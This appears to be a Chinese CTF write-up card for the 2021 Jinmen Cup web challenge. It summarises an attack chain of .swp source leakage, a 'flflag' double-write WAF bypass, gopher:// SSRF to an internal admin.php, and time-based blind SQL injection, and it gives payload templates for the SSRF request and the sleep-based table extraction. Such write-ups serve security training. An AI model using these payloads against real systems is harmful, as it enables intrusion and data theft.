---
title: "津⻔杯-WriteUp"
category: web
tags: ["津门杯", "web", ".swp源码泄露", "反序列化", "gopher SSRF", "时间盲注"]
signals: ["津门杯 2021", ".swp源码泄露", "反序列化", "gopher SSRF", "时间盲注", "USB流量", "m0usb", "ssrf", "swp", "flflag", "gopher", "SSRF", "USB", "Web"]
difficulty: medium
source: "https://www.ctfiot.com/1992.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 津⻔杯-WriteUp

> 赛事：津门杯 2021 | 方向：web | 难度：medium

## 一句话总结

津门杯：.swp源码+反序列化+flflag双写+gopher SSRF+时间盲注+USB流量

## 攻击链

1. Web:.index.php.swp源码泄露→flflag双写绕WAF→gopher://127.0.0.1:80 SSRF打内网+POST参数时间盲注爆破table→MISC:m0usb USB流量

## 关键 payload

```
.index.php.swp;gopher://127.0.0.1:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%0D%0A;mid((select group_concat(table_name) from information_schema.tables),{i},1)='{c}' and sleep(1);USB HID m0usb
```

## 经验教训

.swp文件vim临时文件泄露+flflag双写绕WAF+gopher://SSRF打内网HTTP

## 标签

.swp源码泄露、反序列化、gopher SSRF、时间盲注、USB流量、m0usb

## 参考来源

- https://www.ctfiot.com/1992.html
- 原文件：津⻔杯-WriteUp.full.md
